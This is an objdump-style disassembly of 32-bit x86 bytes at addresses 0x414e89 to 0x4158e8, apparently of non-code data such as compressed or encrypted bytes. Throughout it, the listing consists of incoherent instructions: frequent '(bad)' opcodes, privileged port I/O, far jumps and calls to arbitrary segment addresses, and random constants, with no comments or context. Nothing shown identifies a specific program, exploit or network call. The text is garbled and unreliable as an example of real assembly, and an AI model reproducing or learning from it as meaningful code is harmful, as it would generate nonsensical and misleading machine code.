  414e89:	test   BYTE PTR [edx-0x27],ah
  414e8c:	and    al,0xa8
  414e8e:	out    dx,al
  414e8f:	push   esi
  414e90:	xor    eax,DWORD PTR [eax-0x71]
  414e93:	jbe    0x414e9e
  414e95:	daa    
  414e96:	arpl   ax,ax
  414e98:	out    0xe5,eax
  414e9a:	jge    0x414e2d
  414e9c:	push   ecx
  414e9d:	das    
  414e9e:	gs pop ebx
  414ea0:	jnp    0x414e45
  414ea2:	out    dx,eax
  414ea3:	mov    al,ds:0xb116c6f9
  414ea8:	sbb    edx,DWORD PTR [esp+ecx*2+0x667ed0a2]
  414eaf:	or     ah,ah
  414eb1:	clc    
  414eb2:	push   ebx
  414eb3:	es jmp 0x414f0d
  414eb6:	(bad)  
  414eb7:	or     ch,ch
  414eb9:	mov    BYTE PTR [edi],dl
  414ebb:	sub    al,0xcf
  414ebd:	out    dx,al
  414ebe:	or     DWORD PTR [ecx],edx
  414ec0:	pop    ss
  414ec1:	test   al,0xbf
  414ec3:	or     eax,0x7a534629
  414ec8:	cli    
  414ec9:	repnz xor al,0x19
  414ecc:	or     edx,DWORD PTR [edi+ebx*4+0x7fa125f7]
  414ed3:	lea    edx,[edx]
  414ed5:	inc    ebx
  414ed6:	jmp    0x2882:0x58f9034
  414edd:	popa   
  414ede:	xchg   edi,eax
  414edf:	xchg   esp,eax
  414ee0:	fsub   QWORD PTR [ebx-0x21]
  414ee3:	retf   
  414ee4:	push   edx
  414ee5:	fwait
  414ee6:	cli    
  414ee7:	add    al,0xdd
  414ee9:	int    0xe3
  414eeb:	add    BYTE PTR [eax+0x7f5526d3],dh
  414ef1:	mov    ds:0x7d79828f,al
  414ef6:	test   BYTE PTR ds:0x35339239,dl
  414efc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414efd:	mov    edx,0x4c826b2e
  414f02:	cmp    al,BYTE PTR [edx+0xdbd8d29]
  414f08:	loop   0x414e8b
  414f0a:	pop    ebx
  414f0b:	mov    cl,BYTE PTR gs:[ebp+0x45]
  414f0f:	enter  0x0,0x0
	...
  414f73:	add    BYTE PTR [edi],dh
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd08:0x49ef61e3
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    al,0x1
  414f8a:	add    BYTE PTR [eax],al
  414f8c:	adc    dl,BYTE PTR [edx+0x3268127f]
  414f92:	cmp    eax,0x2943ead7
  414f97:	test   eax,0xfc1b1575
  414f9c:	lahf   
  414f9d:	mov    dh,0xf4
  414f9f:	xor    ebp,DWORD PTR [ecx*1+0x2dfda3f7]
  414fa6:	jge    0x414ff2
  414fa8:	icebp  
  414fa9:	mov    ?,WORD PTR [edi]
  414fab:	pop    edx
  414fac:	mov    ds:0x761a24a0,al
  414fb1:	fisubr WORD PTR [esi+0x31a6df02]
  414fb7:	in     al,dx
  414fb8:	(bad)  
  414fb9:	(bad)  [ebx-0x16]
  414fbc:	aaa    
  414fbd:	mov    eax,ds:0x4e73937c
  414fc2:	popf   
  414fc3:	icebp  
  414fc4:	loope  0x41501c
  414fc6:	cmp    al,0xd8
  414fc8:	mov    bh,0xaa
  414fca:	add    al,0xcb
  414fcc:	popa   
  414fcd:	push   0xffffffe6
  414fcf:	push   0x2f
  414fd1:	sahf   
  414fd2:	inc    edx
  414fd3:	call   0x6dc4:0xb6f8fe5b
  414fda:	lahf   
  414fdb:	jmp    0x4f3:0xb743a84e
  414fe2:	pop    ss
  414fe3:	cld    
  414fe4:	jo     0x414f81
  414fe6:	pop    edi
  414fe7:	push   ds
  414fe8:	or     eax,0x192e6b37
  414fed:	fwait
  414fee:	dec    esp
  414fef:	pop    edi
  414ff0:	pop    ss
  414ff1:	cmp    BYTE PTR [esi+0x27],dl
  414ff4:	cmp    DWORD PTR [ecx],ebp
  414ff6:	mov    ch,0xb9
  414ff8:	test   DWORD PTR [ecx-0x47],ebx
  414ffb:	addr16 sti 
  414ffd:	cmp    dh,BYTE PTR [esi+0x4fc91996]
  415003:	xchg   edx,eax
  415004:	test   eax,0x3bff69fa
  415009:	inc    eax
  41500a:	mov    ds:0x7d28fcfe,al
  41500f:	cmp    BYTE PTR [ebx+0x2fd0b503],0x4f
  415016:	push   ds
  415017:	and    ebp,DWORD PTR [edi+ebp*2-0x22]
  41501b:	inc    ebp
  41501c:	loope  0x414fa0
  41501e:	mov    bh,0xee
  415020:	aam    0x2e
  415022:	push   edx
  415023:	push   eax
  415024:	jns    0x41501f
  415026:	dec    ebx
  415027:	repz and eax,0xe4c01a1e
  41502d:	pop    edi
  41502e:	add    bh,cl
  415030:	dec    ebp
  415031:	mov    ah,0xe1
  415033:	outs   dx,DWORD PTR ds:[esi]
  415034:	fcomp  DWORD PTR [esi-0x4f02d847]
  41503a:	cli    
  41503b:	mov    ebx,0xee4d29c0
  415040:	aad    0x26
  415042:	ret    0xb947
  415045:	xchg   cl,bh
  415047:	ret    
  415048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415049:	mov    al,0xbb
  41504b:	rcl    DWORD PTR [ebp-0x2f9df3b7],cl
  415051:	pop    ecx
  415052:	aaa    
  415053:	shl    BYTE PTR [esi-0x70],cl
  415056:	mov    dl,0xd8
  415058:	add    dl,bl
  41505a:	add    DWORD PTR [ecx-0x2fcbf298],ecx
  415060:	xchg   ebx,eax
  415061:	test   ebx,0xb74aa242
  415067:	cwde   
  415068:	sub    eax,0xcfe26338
  41506d:	mov    edx,0x1beffb20
  415072:	pusha  
  415073:	daa    
  415074:	mov    ch,0xfc
  415076:	loope  0x415018
  415078:	imul   ebp,DWORD PTR [eax],0x519dd839
  41507e:	adc    BYTE PTR [ecx+0x50ed9d3b],0x18
  415085:	xchg   edx,eax
  415086:	je     0x4150e7
  415088:	add    BYTE PTR [edx+0x3f61dab8],dh
  41508e:	or     edi,0x0
	...
  4150f1:	add    BYTE PTR [eax],al
  4150f3:	add    BYTE PTR [ebx+0x2],bh
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0x84ddfc2d
  415102:	and    DWORD PTR [ebp+0xc],esp
  415105:	fiadd  WORD PTR [eax]
  415107:	add    BYTE PTR [ecx+eax*1],al
  41510a:	add    BYTE PTR [eax],al
  41510c:	arpl   WORD PTR [ebx+0x3cb85313],di
  415112:	sub    DWORD PTR cs:[ebx-0x684e66d5],esp
  415119:	sbb    al,BYTE PTR [ebp-0x3c479936]
  41511f:	and    BYTE PTR [eax+0x54ef701f],0xae
  415126:	(bad)  
  415127:	xchg   DWORD PTR [edi+ebx*2],esp
  41512a:	leave  
  41512b:	das    
  41512c:	fist   DWORD PTR [ecx-0x580d10ab]
  415132:	xor    ecx,esi
  415134:	sahf   
  415135:	xchg   DWORD PTR [ecx+0x4e],esi
  415138:	imul   ch
  41513a:	repz call 0x38d3:0x71f2883d
  415142:	jo     0x4150d6
  415144:	jb     0x41510b
  415146:	int    0x15
  415148:	retf   0x8811
  41514b:	out    dx,eax
  41514c:	scas   al,BYTE PTR es:[edi]
  41514d:	mov    ds:0xdce9c02c,al
  415152:	mov    BYTE PTR [eax+0x5c],cl
  415155:	add    al,cl
  415157:	or     ebp,ebx
  415159:	cli    
  41515a:	arpl   WORD PTR [ecx],sp
  41515c:	cmp    ebx,DWORD PTR [esi+edx*2]
  41515f:	retf   0x228
  415162:	sub    BYTE PTR [ebp-0xa],bh
  415165:	push   ecx
  415166:	adc    al,0xf6
  415168:	int3   
  415169:	sbb    DWORD PTR [eax-0x5a03d209],ebp
  41516f:	jg     0x415186
  415171:	lahf   
  415172:	push   esi
  415173:	inc    ecx
  415174:	in     al,dx
  415175:	xchg   ebp,eax
  415176:	outs   dx,DWORD PTR ds:[esi]
  415177:	ins    DWORD PTR es:[edi],dx
  415178:	push   cs
  415179:	test   BYTE PTR [edi],0x1d
  41517c:	xor    DWORD PTR [edi+esi*2-0x5ef71e95],ebp
  415183:	xchg   edx,eax
  415184:	cwde   
  415185:	adc    ah,ch
  415187:	imul   ebp,edx,0xe563c4de
  41518d:	loope  0x415141
  41518f:	and    eax,esp
  415191:	or     eax,0xd50b708a
  415196:	leave  
  415197:	ins    BYTE PTR es:[edi],dx
  415198:	and    ch,dl
  41519a:	or     BYTE PTR [ebp-0x71837dcb],al
  4151a0:	daa    
  4151a1:	in     al,dx
  4151a2:	cwde   
  4151a3:	out    dx,eax
  4151a4:	fdiv   st(7),st
  4151a6:	outs   dx,DWORD PTR ds:[esi]
  4151a7:	sub    ecx,esp
  4151a9:	ins    BYTE PTR es:[edi],dx
  4151aa:	and    DWORD PTR [ebx],0x8575ad8a
  4151b0:	xor    eax,0xbf38b878
  4151b5:	xchg   edi,eax
  4151b6:	nop
  4151b7:	cmp    BYTE PTR [ebp-0x46],bh
  4151ba:	xchg   DWORD PTR [edx-0x21],ebp
  4151bd:	ror    DWORD PTR [esp+edi*1+0x3f75ed85],1
  4151c4:	cs pavgw mm0,mm4
  4151c8:	mov    DWORD PTR ds:0xb76b5b39,esi
  4151ce:	gs mov edi,cs
  4151d1:	pop    ebp
  4151d2:	(bad)  
  4151d3:	aaa    
  4151d4:	out    0x3a,al
  4151d6:	jo     0x4151ed
  4151d8:	inc    eax
  4151d9:	jmp    0x4151f8
  4151db:	aam    0x1f
  4151dd:	push   ss
  4151de:	repz push ds
  4151e0:	push   edx
  4151e1:	into   
  4151e2:	jns    0x415185
  4151e4:	mov    DWORD PTR ds:0xec5f6702,ebx
  4151ea:	aas    
  4151eb:	inc    edx
  4151ec:	dec    eax
  4151ed:	pop    ecx
  4151ee:	cdq    
  4151ef:	iret   
  4151f0:	ins    DWORD PTR es:[edi],dx
  4151f1:	mov    fs,WORD PTR [edx-0x2b]
  4151f4:	pop    edx
  4151f5:	mov    edi,0x4fc08c4b
  4151fa:	adc    ch,bh
  4151fc:	mov    cl,0x47
  4151fe:	fst    QWORD PTR [eax-0x80]
  415201:	stos   BYTE PTR es:[edi],al
  415202:	fisubr WORD PTR [ebx+0x1f]
  415205:	dec    ecx
  415206:	xchg   ebx,eax
  415207:	aas    
  415208:	mov    ah,0xa6
  41520a:	jle    0x4151b5
  41520c:	sbb    dh,al
  41520e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41520f:	das    
	...
  415274:	sub    al,0x97
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x8e36c70b
  415283:	jnp    0x415295
  415285:	fild   WORD PTR [eax]
  415287:	add    BYTE PTR [ecx+eax*1],al
  41528a:	add    BYTE PTR [eax],al
  41528c:	xchg   DWORD PTR [esi-0x72],edi
  41528f:	int    0xe2
  415291:	cwde   
  415292:	dec    edx
  415293:	push   ebx
  415294:	jp     0x4152df
  415296:	clc    
  415297:	sar    DWORD PTR [edi+edi*1],1
  41529a:	pop    es
  41529b:	cli    
  41529c:	es xchg esi,eax
  41529e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41529f:	adc    DWORD PTR [edi],0xc00d3ff3
  4152a5:	xor    BYTE PTR [ebp+ebx*2+0x18],ch
  4152a9:	or     DWORD PTR ds:0x983d47fd,ebp
  4152af:	ins    DWORD PTR es:[edi],dx
  4152b0:	stos   DWORD PTR es:[edi],eax
  4152b1:	(bad)  
  4152b2:	cli    
  4152b3:	mov    ch,0x4e
  4152b5:	call   0xc5af0942
  4152ba:	mov    bl,0x3a
  4152bc:	rol    DWORD PTR [eax+0x36],cl
  4152bf:	pop    esp
  4152c0:	loopne 0x41525e
  4152c2:	ret    0xdb31
  4152c5:	push   ds
  4152c6:	mov    esp,0xf750e5a2
  4152cb:	cmp    al,BYTE PTR [edi]
  4152cd:	nop
  4152ce:	push   0x43
  4152d0:	sahf   
  4152d1:	lahf   
  4152d2:	pusha  
  4152d3:	pop    ss
  4152d4:	fimul  DWORD PTR [ebp+0x31]
  4152d7:	mov    cl,0x3c
  4152d9:	test   eax,0x910a6371
  4152de:	pop    ss
  4152df:	leave  
  4152e0:	leave  
  4152e1:	or     eax,0xe8426f7a
  4152e6:	push   eax
  4152e7:	aas    
  4152e8:	popa   
  4152e9:	in     al,dx
  4152ea:	sbb    dh,0x11
  4152ed:	jo     0x415287
  4152ef:	lds    ebx,FWORD PTR [edx+0x6dda9e1a]
  4152f5:	sub    BYTE PTR [ecx],0x36
  4152f8:	mov    ebx,0xa8d75536
  4152fd:	ret    
  4152fe:	std    
  4152ff:	clc    
  415300:	fst    st(3)
  415302:	fstp   TBYTE PTR [edx]
  415304:	or     cl,BYTE PTR [edi+0x5e79fb25]
  41530a:	jns    0x4152ea
  41530c:	adc    di,WORD PTR [ecx]
  41530f:	std    
  415310:	xor    eax,0x8d93d0b6
  415315:	mov    edx,0xfcc644b1
  41531a:	adc    eax,0x12592707
  41531f:	addr16 in eax,0x21
  415322:	outs   dx,DWORD PTR ds:[esi]
  415323:	xchg   ebp,eax
  415324:	push   esi
  415325:	dec    edx
  415326:	mov    ebp,0xe04388dc
  41532b:	dec    edi
  41532c:	sub    BYTE PTR [esi+eax*1-0x8],dh
  415330:	dec    esp
  415331:	in     eax,0xbe
  415333:	fdiv   DWORD PTR [edx]
  415335:	dec    edi
  415336:	xor    al,cl
  415338:	enter  0x7adf,0xcd
  41533c:	jno    0x41530a
  41533e:	jmp    0x41536d
  415340:	cmp    al,0x8b
  415342:	push   eax
  415343:	add    cl,BYTE PTR [edx]
  415345:	test   eax,0x6fe0ac60
  41534a:	xchg   ebp,eax
  41534b:	cmp    al,0xbc
  41534d:	pop    ss
  41534e:	mov    ebx,0x8e0d8ed
  415353:	pusha  
  415354:	and    esi,DWORD PTR [esi]
  415356:	xor    al,0xf6
  415358:	sbb    esi,edx
  41535a:	xlat   BYTE PTR ss:[ebx]
  41535c:	adc    eax,0x4913ab6
  415361:	add    BYTE PTR [ecx+eiz*8+0x1],cl
  415365:	retf   
  415366:	test   DWORD PTR [ebp-0x6101783d],eax
  41536c:	adc    al,0xc6
  41536e:	add    DWORD PTR gs:[esi-0x39dde512],ecx
  415375:	inc    edx
  415376:	addr16 loop 0x415373
  415379:	cs std 
  41537b:	in     al,dx
  41537c:	pop    esp
  41537d:	repz sar DWORD PTR [esi-0x3a],0xfa
  415382:	popf   
  415383:	mov    ebp,ebp
  415385:	mov    bl,0xff
  415387:	popa   
  415388:	mov    edx,0xf3170d09
  41538d:	mov    bp,0x49
	...
  4153f1:	add    BYTE PTR [eax],al
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x5d3e5b0
  415401:	ss add ch,dh
  415404:	adc    al,0xe0
  415406:	add    BYTE PTR [eax],al
  415408:	add    al,0x1
  41540a:	add    BYTE PTR [eax],al
  41540c:	adc    dl,bh
  41540e:	retf   
  41540f:	lahf   
  415410:	jle    0x4153a2
  415412:	call   0x369a83d1
  415417:	mov    ch,0xf8
  415419:	inc    edi
  41541a:	xchg   ecx,eax
  41541b:	lds    ecx,FWORD PTR [ecx]
  41541d:	pop    ebp
  41541e:	(bad)  
  41541f:	dec    esi
  415420:	pop    edx
  415421:	or     edi,eax
  415423:	cs dec eax
  415425:	gs xchg edx,eax
  415427:	jg     0x4153d1
  415429:	xchg   DWORD PTR [esi+0x79],eax
  41542c:	push   ebp
  41542d:	cmp    al,0x29
  41542f:	loop   0x415498
  415431:	mov    fs,WORD PTR [edx]
  415433:	push   ecx
  415434:	xor    esp,ebx
  415436:	sbb    dl,BYTE PTR [edi+0xe74af50]
  41543c:	sbb    ah,BYTE PTR [edi+0x54]
  41543f:	add    BYTE PTR [esp+eax*4+0x25],0x55
  415444:	in     eax,0x6c
  415446:	dec    ebp
  415447:	aam    0xcf
  415449:	mov    ah,0x9d
  41544b:	xchg   edi,eax
  41544c:	adc    BYTE PTR [ebx-0x504c558b],al
  415452:	retf   
  415453:	mov    al,0x51
  415455:	mul    BYTE PTR [edx+0x188f49d6]
  41545b:	push   ds
  41545c:	shl    DWORD PTR [eax-0x69],cl
  41545f:	in     al,0x9a
  415461:	pop    ss
  415462:	les    esp,FWORD PTR [eax+0x46c43231]
  415468:	pop    eax
  415469:	ret    0xf1b5
  41546c:	fimul  WORD PTR [ebx]
  41546e:	rcr    DWORD PTR [ebp-0x38],0x3b
  415472:	or     DWORD PTR [ebp-0xdb9a4b1],esi
  415478:	(bad)  
  415479:	out    dx,eax
  41547a:	bound  esp,QWORD PTR [edi+0x1c73ed04]
  415480:	jnp    0x415444
  415482:	(bad)  
  415483:	rcr    ecx,0xd8
  415486:	sar    BYTE PTR [edx+0x23],cl
  415489:	push   cs
  41548a:	(bad)  
  41548b:	adc    al,0x91
  41548d:	sub    ecx,0x462be167
  415493:	mov    dl,0xe5
  415495:	mov    cl,0x4d
  415497:	pop    ss
  415498:	enter  0x6f46,0xa
  41549c:	aaa    
  41549d:	aaa    
  41549e:	sub    BYTE PTR [ecx+0x54bceed9],0x9
  4154a5:	sbb    DWORD PTR [ebp+0x3d],eax
  4154a8:	lock pop ebp
  4154aa:	dec    ecx
  4154ab:	or     al,0x94
  4154ad:	dec    ebx
  4154ae:	mov    ebx,0xf5676358
  4154b3:	loope  0x4154ba
  4154b5:	(bad)  
  4154b6:	out    0xf6,al
  4154b8:	pop    ecx
  4154b9:	ds (bad) 
  4154bb:	sar    cl,1
  4154bd:	popa   
  4154be:	aaa    
  4154bf:	mov    ds:0xc8e2766e,eax
  4154c4:	repnz (bad) 
  4154c7:	not    DWORD PTR [esi-0x29ce1059]
  4154cd:	jbe    0x4154f6
  4154cf:	inc    edi
  4154d0:	cmove  ebx,ebp
  4154d3:	js     0x4154f5
  4154d5:	sti    
  4154d6:	(bad)  
  4154d7:	jns    0x4154da
  4154d9:	mov    al,ds:0xe7c64ff0
  4154de:	(bad)  
  4154df:	xor    DWORD PTR [edi],edi
  4154e1:	aaa    
  4154e2:	jmp    0x4154e4
  4154e4:	sbb    dh,BYTE PTR [edx+ebx*1+0x1b]
  4154e8:	scas   al,BYTE PTR es:[edi]
  4154e9:	push   ecx
  4154ea:	or     eax,0xe3ef2b24
  4154ef:	push   esp
  4154f0:	dec    ecx
  4154f1:	adc    bh,BYTE PTR [ecx-0x1e]
  4154f4:	xchg   ecx,eax
  4154f5:	jmp    0x4154fe
  4154f7:	lds    ecx,FWORD PTR [edx]
  4154f9:	data16 addr16 adc al,0xda
  4154fd:	shr    BYTE PTR [ecx],0x7b
  415500:	int3   
  415501:	push   esp
  415502:	cli    
  415503:	ins    DWORD PTR es:[edi],dx
  415504:	xchg   ebp,eax
  415505:	in     al,dx
  415506:	sbb    eax,0xf95ace98
  41550b:	std    
  41550c:	inc    ebx
  41550d:	idiv   DWORD PTR [ecx+eiz*2]
	...
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x4155f7
  415581:	ret    0x9f6e
  415584:	sbb    cl,ah
  415586:	add    BYTE PTR [eax],al
  415588:	add    al,0x1
  41558a:	add    BYTE PTR [eax],al
  41558c:	xor    eax,0x6ca1829a
  415591:	pop    edi
  415592:	stos   DWORD PTR es:[edi],eax
  415593:	push   esp
  415594:	sub    eax,0x925e7f20
  415599:	in     al,0x20
  41559b:	sbb    eax,0xf1f96bd0
  4155a0:	lds    ecx,FWORD PTR [ebp+edx*2+0x7b5b5b9c]
  4155a7:	mov    bl,0x72
  4155a9:	icebp  
  4155aa:	lods   eax,DWORD PTR ds:[esi]
  4155ab:	loop   0x41561f
  4155ad:	xchg   BYTE PTR [eax-0x5aa82e14],ch
  4155b3:	pop    es
  4155b4:	into   
  4155b5:	fstp   QWORD PTR [eax]
  4155b7:	cmc    
  4155b8:	xchg   DWORD PTR [ebp+edi*8-0x218143a8],esp
  4155bf:	push   cs
  4155c0:	xchg   BYTE PTR [edx+ebp*4-0x34],bl
  4155c4:	xchg   esi,eax
  4155c5:	shl    BYTE PTR [esi-0x4e],0x13
  4155c9:	mov    al,ds:0xafe93cd8
  4155ce:	push   ds
  4155cf:	and    eax,0x72719a1b
  4155d4:	enter  0x2e51,0xdf
  4155d8:	loope  0x41559a
  4155da:	xor    edi,DWORD PTR [ebp+0x20]
  4155dd:	mov    WORD PTR [esi-0x1aa009b6],es
  4155e3:	jp     0x415632
  4155e5:	add    BYTE PTR ds:[ebx],cl
  4155e8:	stos   BYTE PTR es:[edi],al
  4155e9:	jmp    0xe237:0x8715ce9d
  4155f0:	daa    
  4155f1:	xchg   edi,eax
  4155f2:	inc    ebp
  4155f3:	rol    DWORD PTR [edi+0x60],1
  4155f6:	adc    al,0x6f
  4155f8:	jb     0x41562b
  4155fa:	hlt    
  4155fb:	sbb    al,0xc7
  4155fd:	pop    ebx
  4155fe:	(bad)  
  4155ff:	out    dx,eax
  415600:	cmc    
  415601:	retf   
  415602:	(bad)  
  415604:	pop    eax
  415605:	pop    esp
  415606:	pushw  es
  415608:	push   es
  415609:	mov    ecx,0xb522ab1b
  41560e:	mov    ch,0x2b
  415610:	(bad)  
  415611:	fist   DWORD PTR ds:0x71d09eef
  415617:	(bad)  
  415618:	(bad)  
  41561a:	xchg   BYTE PTR [edx],dh
  41561c:	xchg   esp,eax
  41561d:	mov    dh,0x7d
  41561f:	scas   al,BYTE PTR es:[edi]
  415620:	gs in  eax,dx
  415622:	icebp  
  415623:	dec    ecx
  415624:	jns    0x41565d
  415626:	push   ebx
  415627:	and    eax,0x8ca5ad69
  41562c:	in     eax,dx
  41562d:	mov    esp,0x30128e5b
  415632:	xchg   BYTE PTR [edi],ah
  415634:	mov    esp,0x433fcee7
  415639:	lea    edi,[eax-0x15]
  41563c:	out    dx,al
  41563d:	in     al,0xd
  41563f:	bound  ecx,QWORD PTR ds:0x18571e3
  415645:	ss imul eax,DWORD PTR fs:0x533941d9,0xffffff87
  41564e:	mov    dl,0x10
  415650:	mov    bl,0xc9
  415652:	xlat   BYTE PTR ds:[ebx]
  415653:	sbb    ebx,ebp
  415655:	mov    DWORD PTR [ebx+0x1e],esi
  415658:	jle    0x4156cb
  41565a:	add    al,0x77
  41565c:	into   
  41565d:	fcomi  st,st(7)
  41565f:	mov    edi,?
  415661:	sub    al,BYTE PTR [edi-0x55]
  415664:	addr16 mov ecx,0xfa676a84
  41566a:	mov    ebx,0x6685d148
  41566f:	and    dl,dh
  415671:	fs repz cli 
  415674:	dec    ebp
  415675:	sub    al,0x57
  415677:	ja     0x41569a
  415679:	lods   eax,DWORD PTR ds:[esi]
  41567a:	jae    0x41566e
  41567c:	(bad)  
  41567d:	xchg   esi,eax
  41567e:	cli    
  41567f:	push   0xffffffd2
  415681:	sub    ah,BYTE PTR [eax+0x245d86ca]
  415687:	fcomp  QWORD PTR [eax]
  415689:	repz das 
  41568b:	push   cs
  41568c:	popf   
  41568d:	sbb    cl,bl
  41568f:	add    BYTE PTR [eax],0x0
	...
  4156f2:	add    BYTE PTR [eax],al
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0x7c
  415701:	mov    DWORD PTR [edi+0xe21ca1],eax
  415707:	add    BYTE PTR [ecx+eax*1],al
  41570a:	add    BYTE PTR [eax],al
  41570c:	jp     0x4156c0
  41570e:	cs inc esp
  415710:	int    0x25
  415712:	inc    ecx
  415713:	sbb    ecx,DWORD PTR [esi+0x3c]
  415716:	adc    bl,BYTE PTR [ebx]
  415718:	jo     0x4156bf
  41571a:	(bad)  
  41571b:	in     eax,dx
  41571c:	adc    dl,BYTE PTR [ebp+0x32]
  41571f:	scas   al,BYTE PTR es:[edi]
  415720:	fwait
  415721:	(bad)  
  415722:	(bad)  
  415723:	mov    dh,0xbd
  415725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415726:	mov    ebp,0xf6023622
  41572b:	jp     0x415734
  41572d:	in     al,0xfe
  41572f:	shl    bh,0x9c
  415732:	inc    esi
  415733:	pop    ebx
  415734:	lea    ebp,[eax-0x41]
  415737:	loop   0x415791
  415739:	repnz call 0x6684:0x1c1898ad
  415741:	push   edx
  415742:	sub    DWORD PTR [esi+0x35b050ba],eax
  415748:	add    BYTE PTR [ebx],cl
  41574a:	and    eax,eax
  41574c:	(bad)  
  41574e:	nop
  41574f:	or     ebx,DWORD PTR [ebx]
  415751:	jb     0x4157be
  415753:	in     eax,dx
  415754:	lds    ebx,FWORD PTR [edx-0x340182e8]
  41575a:	lods   al,BYTE PTR ds:[esi]
  41575b:	lahf   
  41575c:	adc    al,0x3b
  41575e:	ds lock inc esp
  415761:	lods   al,BYTE PTR ds:[esi]
  415762:	arpl   ax,sp
  415764:	retf   0x59ff
  415767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415768:	jmp    DWORD PTR [ebx]
  41576a:	ins    DWORD PTR es:[edi],dx
  41576b:	mov    bh,0xc6
  41576d:	scas   eax,DWORD PTR es:[edi]
  41576e:	aas    
  41576f:	sub    al,0x50
  415771:	mov    bh,0x62
  415773:	je     0x4157d7
  415775:	xchg   ecx,eax
  415776:	lods   eax,DWORD PTR ds:[esi]
  415777:	das    
  415778:	xchg   esp,eax
  415779:	cmp    eax,0xde6ebb7d
  41577e:	ret    0xac05
  415781:	stc    
  415782:	mov    esi,0xcd4ffac7
  415787:	inc    ebx
  415788:	push   es
  415789:	mov    BYTE PTR [edx],bl
  41578b:	(bad)  
  41578c:	test   bh,dh
  41578e:	popa   
  41578f:	in     eax,dx
  415790:	push   eax
  415791:	pop    ebp
  415792:	push   ebp
  415793:	mov    al,ds:0xb620f977
  415798:	pop    eax
  415799:	jg     0x4157ab
  41579b:	out    0x88,al
  41579d:	ja     0x4157a5
  41579f:	sub    al,0x8c
  4157a1:	sub    BYTE PTR ds:0x6120b6d1,0xde
  4157a8:	or     ebp,DWORD PTR [esp+ebp*4-0x6c]
  4157ac:	bound  ebx,QWORD PTR [edx+0x37c7d5f2]
  4157b2:	xchg   ecx,eax
  4157b3:	scas   eax,DWORD PTR es:[edi]
  4157b4:	and    BYTE PTR [edi+0x72d59df8],0xee
  4157bb:	cmp    al,BYTE PTR [edi-0x49]
  4157be:	fidivr DWORD PTR [ebp-0x139e229f]
  4157c4:	pop    esp
  4157c5:	jnp    0x415772
  4157c7:	mov    BYTE PTR ds:[edi],dh
  4157ca:	mov    dl,0xf1
  4157cc:	xchg   edi,eax
  4157cd:	xchg   esi,eax
  4157ce:	ror    DWORD PTR [ebp+0x2e],cl
  4157d1:	aad    0x1
  4157d3:	sub    al,BYTE PTR [eax]
  4157d5:	dec    edi
  4157d6:	bound  edi,QWORD PTR [eax-0x5f]
  4157d9:	pop    ds
  4157da:	mov    ebp,0xc07cfb2d
  4157df:	imul   esi,DWORD PTR [ecx],0x78
  4157e2:	dec    edx
  4157e3:	xor    eax,0x43f4141a
  4157e8:	test   al,0x27
  4157ea:	fist   DWORD PTR [ebx+0x485b31d4]
  4157f0:	sbb    eax,DWORD PTR [ebx+0xb6f29f8]
  4157f6:	dec    eax
  4157f7:	xlat   BYTE PTR ds:[ebx]
  4157f8:	jne    0x415833
  4157fa:	test   al,0xfb
  4157fc:	xchg   ch,dl
  4157fe:	pushf  
  4157ff:	(bad)  
  415800:	push   ss
  415801:	dec    ecx
  415802:	inc    edx
  415803:	mov    ch,0xcf
  415805:	lahf   
  415806:	push   edx
  415807:	xchg   esp,eax
  415808:	pop    ebx
  415809:	ins    DWORD PTR es:[edi],dx
  41580a:	stc    
  41580b:	mov    edx,0x172ac976
	...
  415874:	retf   
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	rol    DWORD PTR [edi+edx*2-0x1cdf558a],cl
  415886:	add    BYTE PTR [eax],al
  415888:	add    al,0x1
  41588a:	add    BYTE PTR [eax],al
  41588c:	add    bh,al
  41588e:	jns    0x4158df
  415890:	pop    ebx
  415891:	ficom  DWORD PTR [ebx+0x7c406c6d]
  415897:	data16 aaa 
  415899:	and    DWORD PTR [eax+0x7d],0x7a9c57ee
  4158a0:	not    DWORD PTR [edx]
  4158a2:	jnp    0x4158c8
  4158a4:	mov    cl,0x58
  4158a6:	cdq    
  4158a7:	leave  
  4158a8:	and    ecx,eax
  4158aa:	adc    al,0xe
  4158ac:	lods   al,BYTE PTR ds:[esi]
  4158ad:	cmp    al,0x6e
  4158af:	pshufw mm6,mm5,0xd3
  4158b3:	inc    esp
  4158b4:	out    dx,eax
  4158b5:	cmp    ebx,esp
  4158b7:	cmp    BYTE PTR [ecx],al
  4158b9:	loopne 0x41590a
  4158bb:	pop    ebx
  4158bc:	sub    al,0xed
  4158be:	xor    bl,BYTE PTR [ebp-0xaa803d]
  4158c4:	arpl   ax,sp
  4158c6:	push   edi
  4158c7:	jl     0x4158c2
  4158c9:	ins    BYTE PTR es:[edi],dx
  4158ca:	xchg   esp,eax
  4158cb:	or     BYTE PTR [ebx],0x41
  4158ce:	call   DWORD PTR [edi]
  4158d0:	mov    ch,0xcc
  4158d2:	pop    eax
  4158d3:	das    
  4158d4:	icebp  
  4158d5:	rol    dl,1
  4158d7:	enter  0xdef5,0x2e
  4158db:	ror    BYTE PTR [ebp-0x544fafdf],0x91
  4158e2:	adc    eax,0xe8531a43
  4158e7:	push   ebx
  4158e8:	mov    edi,0x37350de4
